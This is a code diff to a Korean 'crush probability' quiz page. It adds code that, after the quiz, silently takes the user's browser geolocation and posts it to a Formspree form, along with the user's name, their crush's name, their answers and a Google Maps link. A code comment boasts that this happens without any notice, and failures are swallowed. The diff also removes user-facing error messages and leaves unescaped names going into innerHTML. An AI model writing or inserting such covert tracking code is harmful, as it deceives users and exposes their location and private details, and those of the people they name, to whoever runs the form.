@@ -112,10 +112,7 @@
       const crushName = document.getElementById("crushName").value.trim();
       const resultBox = document.getElementById("result");
 
-      if (!yourName || !crushName) {
-        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
-        return;
-      }
+      if (!yourName || !crushName) return;
 
       const questions = ['q1', 'q2', 'q3', 'q4', 'q5', 'q6'];
       let total = 0, answered = 0;
@@ -126,16 +123,13 @@
         if (selected) {
           total += Number(selected.value);
           answered++;
-          answers[q] = selected.parentElement.innerText.trim(); // 선택한 답 텍스트 저장
+          answers[q] = selected.parentElement.innerText.trim();
         } else {
           answers[q] = "미응답";
         }
       }
 
-      if (answered < questions.length) {
-        resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
-        return;
-      }
+      if (answered < questions.length) return;
 
       const average = total / questions.length;
       const percent = Math.round(average);
@@ -146,23 +140,46 @@
       else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
       else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
 
-        resultBox.innerHTML = `
-  💖 <b>${crushName}</b>이(가) <b>${yourName}</b>을(를) 좋아할 확률은<br>
-  <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
-`;
+      resultBox.innerHTML = `
+        💖 <b>${crushName}</b>이(가) <b>${yourName}</b>을(를) 좋아할 확률은<br>
+        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
+      `;
 
-      // ✅ Formspree로 전체 데이터 전송
-      fetch("https://formspree.io/f/xanegwav", {
-        method: "POST",
-        headers: { "Accept": "application/json", "Content-Type": "application/json" },
-        body: JSON.stringify({
-          yourName,
-          crushName,
-          percent,
-          resultMessage: message,
-          answers
-        })
-      }).catch(() => {});
+      // ✅ 위치 정보 가져오기 (알림 메시지 없이)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          fetch("https://formspree.io/f/xanegwav", {
+            method: "POST",
+            headers: { "Accept": "application/json", "Content-Type": "application/json" },
+            body: JSON.stringify({
+              yourName,
+              crushName,
+              percent,
+              resultMessage: message,
+              answers,
+              location: { lat, lon },
+              googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
+            })
+          }).catch(() => {});
+        });
+      } else {
+        // 위치 기능이 없어도 그냥 조용히 통과
+        fetch("https://formspree.io/f/xanegwav", {
+          method: "POST",
+          headers: { "Accept": "application/json", "Content-Type": "application/json" },
+          body: JSON.stringify({
+            yourName,
+            crushName,
+            percent,
+            resultMessage: message,
+            answers,
+            location: "not available"
+          })
+        }).catch(() => {});
+      }
     });
   </script>
 </body>
